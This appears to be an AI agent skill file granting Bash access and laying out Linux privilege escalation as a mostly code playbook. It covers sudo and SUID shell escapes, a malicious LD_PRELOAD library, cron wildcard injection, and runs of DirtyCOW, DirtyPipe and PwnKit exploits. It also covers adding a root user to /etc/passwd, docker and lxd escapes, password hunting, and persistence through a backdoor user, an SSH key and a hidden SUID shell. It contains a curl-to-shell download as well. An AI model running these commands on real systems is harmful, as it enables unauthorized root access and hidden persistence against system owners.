---
name: linux-privesc
description: Comprehensive Linux privilege escalation techniques including automated enumeration, manual checks, and exploitation methods
allowed-tools: Bash, Read, Write, Grep
---

# Linux Privilege Escalation Skill

## Purpose
Provides systematic approaches for escalating privileges on Linux systems from low-privilege users to root, including automated enumeration, manual techniques, and exploitation methods.

## Automated Enumeration

### Enumeration Scripts
```bash
# Run comprehensive enumeration
scripts/linux-privesc-check.sh

# LinPEAS - Most comprehensive
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t -k password

# Linux Smart Enumeration (LSE)
./lse.sh -l 1  # Level 1 (interesting stuff)
./lse.sh -l 2  # Level 2 (all tests)

# Linux Exploit Suggester
./linux-exploit-suggester.sh

# Process monitoring without root
./pspy64 -f  # Monitor file system events
./pspy64 -p  # Monitor processes
```

## SUDO Privilege Escalation

### SUDO Enumeration
```bash
# Check sudo privileges
sudo -l
sudo -ll  # Long format

# Check sudo version for vulnerabilities
sudo -V
# CVE-2019-14287: sudo < 1.8.28
# CVE-2021-3156 (Baron Samedit): sudo < 1.9.5p2
```

### SUDO Exploitation Techniques

#### GTFOBins SUDO Exploits
```bash
# Vim
sudo vim -c ':!/bin/bash'
sudo vim
:set shell=/bin/bash
:shell

# Less
sudo less /etc/passwd
!/bin/bash

# More
sudo more /etc/passwd
!/bin/bash

# Awk
sudo awk 'BEGIN {system("/bin/bash")}'

# Find
sudo find . -exec /bin/bash \; -quit

# Python
sudo python -c 'import os; os.system("/bin/bash")'
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

# Perl
sudo perl -e 'exec "/bin/bash";'

# Ruby
sudo ruby -e 'exec "/bin/bash"'

# Man
sudo man man
!/bin/bash

# FTP
sudo ftp
!/bin/bash

# Git
sudo git -p help config
!/bin/bash

# Nano
sudo nano
^R^X
reset; sh 1>&0 2>&0

# Apache2
sudo apache2 -f /etc/shadow
```

#### SUDO Environment Variables
```bash
# LD_PRELOAD exploitation
# Create malicious library
cat > /tmp/privesc.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/privesc.so /tmp/privesc.c -nostartfiles
sudo LD_PRELOAD=/tmp/privesc.so any_sudo_command

# PATH exploitation
# If secure_path is not set
echo '/bin/bash' > /tmp/ls
chmod +x /tmp/ls
sudo PATH=/tmp:$PATH ls
```

## SUID/SGID Binary Exploitation

### Finding SUID/SGID Binaries
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
scripts/suid-finder.sh

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Find both SUID and SGID
find / -perm -6000 -type f 2>/dev/null
```

### SUID Binary Exploitation

#### GTFOBins SUID Exploits
```bash
# Base64
./base64 /etc/shadow | base64 -d

# CP (copy)
./cp /etc/shadow /tmp/shadow
cat /tmp/shadow

# Find
./find . -exec /bin/bash -p \; -quit

# Python
./python -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# Perl
./perl -e 'exec "/bin/bash";'

# Vim
./vim -c ':py import os; os.execl("/bin/bash", "bash", "-p")'

# Less/More
./less /etc/shadow
./more /etc/shadow

# Systemctl
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```

#### Custom SUID Binary Exploitation
```bash
# Check for buffer overflow
./suid_binary $(python -c 'print("A"*1000)')

# Check for command injection
./suid_binary "test; id"
./suid_binary "test`id`"
./suid_binary "test$(id)"

# Check for PATH manipulation
PATH=.:$PATH ./suid_binary

# Shared library hijacking
ldd ./suid_binary  # Check libraries
# Create malicious library
gcc -shared -fPIC -o /tmp/evil.so evil.c
LD_PRELOAD=/tmp/evil.so ./suid_binary
```

## Linux Capabilities

### Capability Enumeration
```bash
# Find files with capabilities
getcap -r / 2>/dev/null
scripts/capability-checker.py

# Check current process capabilities
capsh --print
```

### Capability Exploitation
```bash
# CAP_SETUID
./python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# CAP_DAC_OVERRIDE (bypass file permissions)
./vim /etc/shadow

# CAP_DAC_READ_SEARCH (read any file)
./tar -czf /tmp/shadow.tar.gz /etc/shadow
tar -xzf /tmp/shadow.tar.gz

# CAP_NET_BIND_SERVICE (bind to privileged ports)
# Can be used for traffic interception

# CAP_SYS_ADMIN (almost root)
# Mount filesystems, various privileged operations
```

## Cron Job Exploitation

### Cron Enumeration
```bash
# System cron jobs
cat /etc/crontab
ls -la /etc/cron*
cat /etc/cron.d/*

# User cron jobs
crontab -l
ls -la /var/spool/cron/
ls -la /var/spool/cron/crontabs/

# Monitor cron execution
grep "CRON" /var/log/syslog
grep "CRON" /var/log/cron.log

# Watch for cron job execution
./pspy64  # Monitor without root
```

### Cron Exploitation Techniques
```bash
# Writable cron script
echo '#!/bin/bash
chmod +s /bin/bash' > /path/to/cron/script.sh

# PATH variable exploitation in cron
# If PATH includes writable directory
echo '#!/bin/bash
cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /tmp/executable_name
chmod +x /tmp/executable_name

# Wildcard exploitation
# If cron uses: tar czf backup.tar.gz *
echo '' > '--checkpoint=1'
echo '' > '--checkpoint-action=exec=bash script.sh'
```

## Kernel Exploitation

### Kernel Information
```bash
# Kernel version
uname -a
uname -r
cat /proc/version

# Distribution information
lsb_release -a
cat /etc/os-release
cat /etc/*-release

# Architecture
arch
uname -m
```

### Kernel Exploit Detection
```bash
# Run kernel exploit suggester
scripts/kernel-exploit-suggester.sh

# Check for specific vulnerabilities
# DirtyCOW (CVE-2016-5195) - Linux < 4.8.3
# DirtyPipe (CVE-2022-0847) - Linux 5.8 - 5.16.11
# PwnKit (CVE-2021-4034) - Polkit pkexec
# Baron Samedit (CVE-2021-3156) - sudo < 1.9.5p2
```

### Common Kernel Exploits
```bash
# DirtyCOW
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password

# DirtyPipe
gcc dirtypipe.c -o dirtypipe
./dirtypipe /etc/passwd 1 "${$(cat /etc/passwd)/root:x/root:}"

# PwnKit
gcc pwnkit.c -o pwnkit
./pwnkit

# Check if vulnerable
pkexec --version  # Affected: < 0.120
```

## File and Directory Permissions

### Writable Files
```bash
# World-writable files
find / -writable -type f 2>/dev/null
find / -perm -002 -type f 2>/dev/null

# Writable /etc/passwd
ls -la /etc/passwd
# If writable, add root user:
echo 'newroot:$6$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd

# Writable /etc/shadow
ls -la /etc/shadow
# If readable, extract hashes for cracking

# Writable scripts executed by root
find / -writable -type f -exec ls -la {} \; 2>/dev/null | grep -E "root|cron"
```

### PATH Exploitation
```bash
# Check PATH
echo $PATH

# If PATH contains writable directory
cd /tmp
echo '/bin/bash' > ls
chmod +x ls
export PATH=/tmp:$PATH
# Now any SUID binary calling 'ls' will execute our bash
```

## Service Exploitation

### MySQL UDF Privilege Escalation
```bash
# If MySQL runs as root
mysql -u root -p

# Create UDF
use mysql;
create table foo(line blob);
insert into foo values(load_file('/usr/share/sqlmap/udf/mysql/linux/64/lib_mysqludf_sys.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
select sys_exec('chmod +s /bin/bash');
```

### Docker Group Privilege Escalation
```bash
# Check if user in docker group
id
groups

# If in docker group
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
docker run --rm -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh
```

### LXD Group Privilege Escalation
```bash
# If in lxd group
lxc image import alpine.tar.gz --alias myimage
lxd init --auto
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

## NFS Exploitation

### NFS Enumeration
```bash
# Check NFS exports
showmount -e {target}
cat /etc/exports

# Mount NFS share
mount -t nfs {target}:/share /mnt

# Check for no_root_squash
grep no_root_squash /etc/exports
```

### NFS Privilege Escalation
```bash
# If no_root_squash is set
# On attacker machine as root:
mount -t nfs {target}:/share /mnt
cp /bin/bash /mnt/
chmod +s /mnt/bash

# On target machine:
/share/bash -p
```

## Password Hunting

### Common Password Locations
```bash
# Configuration files
grep -r "password\|passwd\|pwd" /etc 2>/dev/null
grep -r "password\|passwd\|pwd" /var/www 2>/dev/null
find / -name "*.conf" -exec grep -l password {} \; 2>/dev/null

# History files
cat ~/.bash_history | grep -E "passwd|password|mysql|ssh"
find / -name "*history" -exec cat {} \; 2>/dev/null | grep -E "passwd|password"

# Database files
find / -name "*.db" -o -name "*.sqlite" 2>/dev/null

# Backup files
find / -name "*.bak" -o -name "*.backup" -o -name "*.old" 2>/dev/null
```

## Escape Restricted Shells

### Common Restricted Shell Escapes
```bash
# Vi/Vim
vi
:set shell=/bin/bash
:shell

# Ed
ed
!sh

# Python
python -c 'import pty; pty.spawn("/bin/bash")'

# Perl
perl -e 'exec "/bin/bash";'

# AWK
awk 'BEGIN {system("/bin/bash")}'

# Find
find / -name test -exec /bin/bash \;

# SSH
ssh user@localhost -t "/bin/bash"

# Expect
expect -c 'spawn /bin/bash; interact'
```

## Persistence After Root

### Creating Backdoor User
```bash
# Add backdoor user
useradd -m -s /bin/bash backdoor
echo 'backdoor:password' | chpasswd
usermod -aG sudo backdoor

# Hide user from /etc/passwd
# Use UID < 1000 to appear as system user
```

### SSH Key Persistence
```bash
# Add SSH key
mkdir -p /root/.ssh
echo "ssh-rsa YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

### SUID Backdoor
```bash
# Create SUID shell
cp /bin/bash /tmp/.backdoor
chmod +s /tmp/.backdoor
# Access: /tmp/.backdoor -p
```

## Best Practices

1. **Run enumeration scripts first** - They catch most vectors
2. **Check sudo privileges immediately** - Often the easiest path
3. **Look for credentials** - Reuse is common
4. **Monitor processes** - Cron jobs and services reveal opportunities
5. **Try kernel exploits last** - They can crash systems
6. **Document your path** - For reporting and repeatability
7. **Clean up after yourself** - Remove exploits and backdoors

## Notes

- Always check multiple privilege escalation vectors
- Some techniques may trigger security monitoring
- Kernel exploits should be tested carefully as they can crash systems
- Keep enumeration scripts updated with latest techniques
- Consider the stability of the system before running exploits